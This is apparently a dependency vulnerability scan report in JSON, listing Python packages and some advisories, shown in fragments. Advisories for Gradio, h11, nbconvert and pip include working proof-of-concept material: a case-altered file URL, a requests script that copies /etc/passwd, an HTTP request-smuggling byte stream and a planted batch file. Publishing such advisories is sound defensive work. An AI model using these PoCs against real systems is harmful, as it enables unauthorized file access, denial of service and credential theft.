This vulnerability arises due to the lack of case normalization in the file path validation logic. On case-insensitive file systems, such as those used by Windows and macOS, this flaw enables attackers to circumvent security restrictions and access sensitive files that should be protected.  This issue can lead to unauthorized data access, exposing sensitive information and undermining the integrity of Gradio's security model. Given Gradio's popularity for building web applications, particularly in machine learning and AI, this vulnerability may pose a substantial threat if exploited in production environments.  ## Affected Version  Gradio <= 5.6.0  ## Impact  - **Unauthorized Access**: Sensitive files or directories specified in `blocked_paths` can be accessed by attackers.  - **Data Exposure**: Critical files, such as configuration files or user data, may be leaked.  - **Security Breach**: This can lead to broader application or system compromise if sensitive files contain credentials or API keys.  ## Root Cause  The [`blocked_paths`](https://github.com/gradio-app/gradio/blob/main/gradio/blocks.py#L2310) parameter in Gradio block's initial configuration is designed to restrict user access to specific files or directories in the local file system. However, it does not account for case-insensitive operating systems, such as Windows and macOS. This oversight enables attackers to bypass ACL restrictions by changing the case of file paths.  Vulnerable snippet:   ```python # https://github.com/gradio-app/gradio/blob/main/gradio/utils.py#L1500-L1517 def is_allowed_file(     path: Path,     blocked_paths: Sequence[str | Path],     allowed_paths: Sequence[str | Path],     created_paths: Sequence[str | Path], ) -> tuple[     bool, Literal[\"in_blocklist\", \"allowed\", \"created\", \"not_created_or_allowed\"] ]:     in_blocklist = any(         is_in_or_equal(path, blocked_path) for blocked_path in blocked_paths     )     if in_blocklist:         return False, \"in_blocklist\"     if any(is_in_or_equal(path, allowed_path) for allowed_path in allowed_paths):         return True, \"allowed\"     if any(is_in_or_equal(path, created_path) for created_path in created_paths):         return True, \"created\"     return False, \"not_created_or_allowed\" ```  Gradio relies on `is_in_or_equal` to determine if a file path is restricted. However, this logic fails to handle case variations in paths on case-insensitive file systems, leading to the bypass.  ## Proof of Concept (PoC)  ### Steps to Reproduce  - Deploy a Gradio demo app on a case-insensitive operating system (e.g., Windows or macOS).    ```bash   import gradio as gr   def update(name):       return f\"Welcome to Gradio, {name}!\"      with gr.Blocks() as demo:       gr.Markdown(\"Start typing below and then click **Run** to see the output.\")       with gr.Row():           inp = gr.Textbox(placeholder=\"What is your name?\")           out = gr.Textbox()       btn = gr.Button(\"Run\")       btn.click(fn=update, inputs=inp, outputs=out)      demo.launch(blocked_paths=['resources/admin'], allowed_paths=['resources/'])   ```  - Set up the file system:    - Create a folder named `resources` in the same directory as the app, containing a file `1.txt`.    - Inside the `resources` folder, create a subfolder named `admin` containing a sensitive file `credential.txt` (this file should be inaccessible due to `blocked_paths`).  - Perform the attack:    - Access the sensitive file using a case-altered path:      ```     http://127.0.0.1:PORT/gradio_api/file=resources/adMin/credential.txt     ```  ### Expected Result  Access to `resources/admin/credential.txt` should be blocked.  ### Actual Result  By altering the case in the path (e.g., `adMin`), the blocked ACL is bypassed, and unauthorized access to the sensitive file is granted.  ![image-20241119172439042](https://api.2h0ng.wiki:443/noteimages/2024/11/19/17-24-39-883969d4c31ce8a8d2a939654fab56d4.png)  This demonstration highlights that flipping the case of restricted paths allows attackers to bypass Gradio's ACL and access sensitive data.  ## Remediation Recommendations  1. **Normalize Path Case**:     - Before evaluating paths against the ACL, normalize the case of both the requested path and the blocked paths (e.g., convert all paths to lowercase).     - Example:       ```python      normalized_path = str(path).lower()      normalized_blocked_paths = [str(p).lower() for p in blocked_paths]      ```  2. **Update Documentation**:     - Warn developers about potential risks when deploying Gradio on case-insensitive file systems.  3. **Release Security Patches**:     - Notify users of the vulnerability and release an updated version of Gradio with the fixed logic.  ## "}, {"id": "CVE-2025-48889", "fix_versions": ["5.31.0"], "aliases": ["GHSA-8jw3-6x8j-v96g"], "description": "An arbitrary file copy vulnerability in Gradio's flagging feature allows unauthenticated attackers to copy any readable file from the server's filesystem. While attackers can't read these copied files, they can cause DoS by copying large files (like /dev/urandom) to fill disk space.  ### Description The flagging component doesn't properly validate file paths before copying files. Attackers can send specially crafted requests to the `/gradio_api/run/predict` endpoint to trigger these file copies.  **Source**: User-controlled `path` parameter in the flagging functionality JSON payload   **Sink**: `shutil.copy` operation in `FileData._copy_to_dir()` method  The vulnerable code flow: 1. A JSON payload is sent to the `/gradio_api/run/predict` endpoint 2. The `path` field within `FileData` object can reference any file on the system 3. When processing this request, the `Component.flag()` method creates a `GradioDataModel` object 4. The `FileData._copy_to_dir()` method uses this path without proper validation:  ```python def _copy_to_dir(self, dir: str) -> FileData:     pathlib.Path(dir).mkdir(exist_ok=True)     new_obj = dict(self)      if not self.path:         raise ValueError(\"Source file path is not set\")     new_name = shutil.copy(self.path, dir)  # vulnerable sink     new_obj[\"path\"] = new_name     return self.__class__(**new_obj) ``` 5. The lack of validation allows copying any file the Gradio process can read  ### PoC The following script demonstrates the vulnerability by copying `/etc/passwd` from the server to Gradio's flagged directory:   Setup a Gradio app:  ```python import gradio as gr  def image_classifier(inp):     return {'cat': 0.2, 'dog': 0.8}  test = gr.Interface(fn=image_classifier, inputs=\"image\", outputs=\"label\")  test.launch(share=True) ```  Run the PoC:  ```python import requests  url = \"https://[your-gradio-app-url]/gradio_api/run/predict\"   headers = {     \"Content-Type\": \"application/json\",       \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\"  }  payload = {     \"data\": [         {             \"path\": \"/etc/passwd\",               \"url\": \"[your-gradio-app-url]\",             \"orig_name\": \"network_config\",              \"size\": 5000,               \"mime_type\": \"text/plain\",              \"meta\": {                 \"_type\": \"gradio.FileData\"               }         },         {}       ],     \"event_data\": None,     \"fn_index\": 4,      \"trigger_id\": 11,      \"session_hash\": \"test123\"   }  response = requests.post(url, headers=headers, json=payload) print(f\"Status Code: {response.status_code}\") print(f\"Response Body: {response.text}\") ```"}]}, {"name": "gradio-client", "version": "0.5.0", "vulns": []}, {"name": "grandalf", "version": "0.8", "vulns": []}, {"name": "graphene", "version": "3.4.3", "vulns": []}, {"name": "graphql-core", "version": "3.2.7", "vulns": []}, {"name": "graphql-relay", "version": "3.2.0", "vulns": []}, {"name": "greenlet", "version": "3.3.0", "vulns": []}, {"name": "griffe", "version": "1.15.0", "vulns": []}, {"name": "grpcio", "version": "1.76.0", "vulns": []}, {"name": "gto", "version": "1.9.0", "vulns": []}, {"name": "gunicorn", "version": "23.0.0", "vulns": []}, {"name": "h11", "version": "0.12.0", "vulns": [{"id": "CVE-2025-43859", "fix_versions": ["0.16.0"], "aliases": ["GHSA-vqfr-h8mv-ghfj"], "description": "### Impact  A leniency in h11's parsing of line terminators in chunked-coding message bodies can lead to request smuggling vulnerabilities under certain conditions.  ### Details  HTTP/1.1 Chunked-Encoding bodies are formatted as a sequence of \"chunks\", each of which consists of:  - chunk length - `\\r\\n` - `length` bytes of content - `\\r\\n`  In versions of h11 up to 0.14.0, h11 instead parsed them as:  - chunk length - `\\r\\n` - `length` bytes of content - any two bytes  i.e. it did not validate that the trailing `\\r\\n` bytes were correct, and if you put 2 bytes of garbage there it would be accepted, instead of correctly rejecting the body as malformed.  By itself this is harmless. However, suppose you have a proxy or reverse-proxy that tries to analyze HTTP requests, and your proxy has a _different_ bug in parsing Chunked-Encoding, acting as if the format is:  - chunk length - `\\r\\n` - `length` bytes of content - more bytes of content, as many as it takes until you find a `\\r\\n`  For example, [pound](https://github.com/graygnuorg/pound/pull/43) had this bug -- it can happen if an implementer uses a generic \"read until end of line\" helper to consumes the trailing `\\r\\n`.  In this case, h11 and your proxy may both accept the same stream of bytes, but interpret them differently. For example, consider the following HTTP request(s) (assume all line breaks are `\\r\\n`):  ``` GET /one HTTP/1.1 Host: localhost Transfer-Encoding: chunked  5 AAAAAXX2 45 0  GET /two HTTP/1.1 Host: localhost Transfer-Encoding: chunked  0 ```  Here h11 will interpret it as two requests, one with body `AAAAA45` and one with an empty body, while our hypothetical buggy proxy will interpret it as a single request, with body `AAAAXX20\\r\\n\\r\\nGET /two ...`. And any time two HTTP processors both accept the same string of bytes but interpret them differently, you have the conditions for a \"request smuggling\" attack. For example, if `/two` is a dangerous endpoint and the job of the reverse proxy is to stop requests from getting there, then an attacker could use a bytestream like the above to circumvent this protection.  Even worse, if our buggy reverse proxy receives two requests from different users:  ``` GET /one HTTP/1.1 Host: localhost Transfer-Encoding: chunked  5 AAAAAXX999 0 ```  ``` GET /two HTTP/1.1 Host: localhost Cookie: SESSION_KEY=abcdef... ```  ...it will consider the first request to be complete and valid, and send both on to the h11-based web server over the same socket. The server will then see the two concatenated requests, and interpret them as _one_ request to `/one` whose body includes `/two`'s session key, potentially allowing one user to steal another's credentials.  ### Patches  Fixed in h11 0.15.0.  ### Workarounds  Since exploitation requires the combination of buggy h11 with a buggy (reverse) proxy, fixing either component is sufficient to mitigate this issue.  ### Credits  Reported by Jeppe Bonde Weikop on 2025-01-09."}]}, {"name": "hf-xet", "version": "1.2.0", "vulns": []}, {"name": "httpcore", "version": "0.15.0", "vulns": []},

Pointing to the incriminated source code is very helpful for the maintainer._  `nbconvert` searches for an `inkscape` executable when converting notebooks to PDFs here: https://github.com/jupyter/nbconvert/blob/4f61702f5c7524d8a3c4ac0d5fc33a6ac2fa36a7/nbconvert/preprocessors/svg2pdf.py#L104  The MITRE page on [CWE-427 (Uncontrolled Search Path Element)](https://cwe.mitre.org/data/definitions/427.html) summarizes the root cause succinctly:  > In Windows-based systems, when the `LoadLibrary` or `LoadLibraryEx` function is called with a DLL name that does not contain a fully qualified path, the function follows a search order that includes two path elements that might be uncontrolled: > - the directory from which the program has been loaded > - the current working directory  ### PoC  _Complete instructions, including specific configuration details, to reproduce the vulnerability._  1. Create a directory containing:       - A hidden bat file called `inkscape.bat` containing `msg * \"You've been hacked!\"`      - A dummy ipynb file called `Machine_Learning.ipynb`  2. Run the command `jupyter nbconvert --to pdf Machine_Learning.ipynb`.  3. Wait a few seconds, and you should see a popup showing the message \"You've been hacked!\"   ### Impact  All Windows users."}]}, {"name": "nbformat", "version": "5.10.4", "vulns": []}, {"name": "nest-asyncio", "version": "1.6.0", "vulns": []}, {"name": "networkx", "version": "3.4.2", "vulns": []}, {"name": "nltk", "version": "3.9.2", "vulns": []}, {"name": "nodeenv", "version": "1.10.0", "vulns": []}, {"name": "notebook", "version": "7.5.1", "vulns": []}, {"name": "notebook-shim", "version": "0.2.4", "vulns": []}, {"name": "numba", "version": "0.63.1", "vulns": []}, {"name": "numpy", "version": "1.26.2", "vulns": []}, {"name": "oauth2client", "version": "4.1.3", "vulns": []}, {"name": "omegaconf", "version": "2.3.0", "vulns": []}, {"name": "open-clip-torch", "version": "2.20.0", "vulns": []}, {"name": "opencv-python", "version": "4.11.0.86", "vulns": []}, {"name": "opentelemetry-api", "version": "1.39.1", "vulns": []}, {"name": "opentelemetry-proto", "version": "1.39.1", "vulns": []}, {"name": "opentelemetry-sdk", "version": "1.39.1", "vulns": []}, {"name": "opentelemetry-semantic-conventions", "version": "0.60b1", "vulns": []}, {"name": "orjson", "version": "3.11.5", "vulns": []}, {"name": "overrides", "version": "7.7.0", "vulns": []}, {"name": "packageurl-python", "version": "0.17.6", "vulns": []}, {"name": "packaging", "version": "25.0", "vulns": []}, {"name": "paginate", "version": "0.5.7", "vulns": []}, {"name": "pandas", "version": "2.3.3", "vulns": []}, {"name": "pandocfilters", "version": "1.5.1", "vulns": []}, {"name": "parso", "version": "0.8.5", "vulns": []}, {"name": "pathspec", "version": "0.12.1", "vulns": []}, {"name": "pexpect", "version": "4.9.0", "vulns": []}, {"name": "piexif", "version": "1.1.3", "vulns": []}, {"name": "pillow", "version": "12.0.0", "vulns": []}, {"name": "pillow-avif-plugin", "version": "1.4.3", "vulns": []}, {"name": "pip", "version": "23.0.1", "vulns": [{"id": "PYSEC-2023-228", "fix_versions": ["23.3"], "aliases": ["GHSA-mq26-g339-26xf", "CVE-2023-5752"], "description": "When installing a package from a Mercurial VCS URL  (ie \"pip install  hg+...\") with pip prior to v23.3, the specified Mercurial revision could  be used to inject arbitrary configuration options to the \"hg clone\"  call (ie \"--config\").

This issue can be exploited by attackers who can control the patterns in these lists, potentially causing the machine learning task to hang and rendering services unresponsive."}]}, {"name": "triton", "version": "2.1.0", "vulns": []}, {"name": "typer", "version": "0.21.0", "vulns": []}, {"name": "typer-slim", "version": "0.21.0", "vulns": []}, {"name": "typing-extensions", "version": "4.15.0", "vulns": []}, {"name": "typing-inspection", "version": "0.4.2", "vulns": []}, {"name": "tzdata", "version": "2025.3", "vulns": []}, {"name": "tzlocal", "version": "5.3.1", "vulns": []}, {"name": "uri-template", "version": "1.3.0", "vulns": []}, {"name": "uritemplate", "version": "4.2.0", "vulns": []}, {"name": "urllib3", "version": "2.6.2", "vulns": []}, {"name": "uvicorn", "version": "0.40.0", "vulns": []}, {"name": "uvloop", "version": "0.22.1", "vulns": []}, {"name": "vine", "version": "5.1.0", "vulns": []}, {"name": "virtualenv", "version": "20.35.4", "vulns": []}, {"name": "voluptuous", "version": "0.16.0", "vulns": []}, {"name": "wandb", "version": "0.23.1", "vulns": []}, {"name": "watchdog", "version": "6.0.0", "vulns": []}, {"name": "watchfiles", "version": "1.1.1", "vulns": []}, {"name": "wcwidth", "version": "0.2.14", "vulns": []}, {"name": "webcolors", "version": "25.10.0", "vulns": []}, {"name": "webencodings", "version": "0.5.1", "vulns": []}, {"name": "websocket-client", "version": "1.9.0", "vulns": []}, {"name": "websockets", "version": "11.0.3", "vulns": []}, {"name": "werkzeug", "version": "3.1.4", "vulns": []}, {"name": "widgetsnbextension", "version": "4.0.15", "vulns": []}, {"name": "yarl", "version": "1.22.0", "vulns": []}, {"name": "zc-lockfile", "version": "4.0", "vulns": []}, {"name": "zipp", "version": "3.23.0", "vulns": []}], "fixes": []}
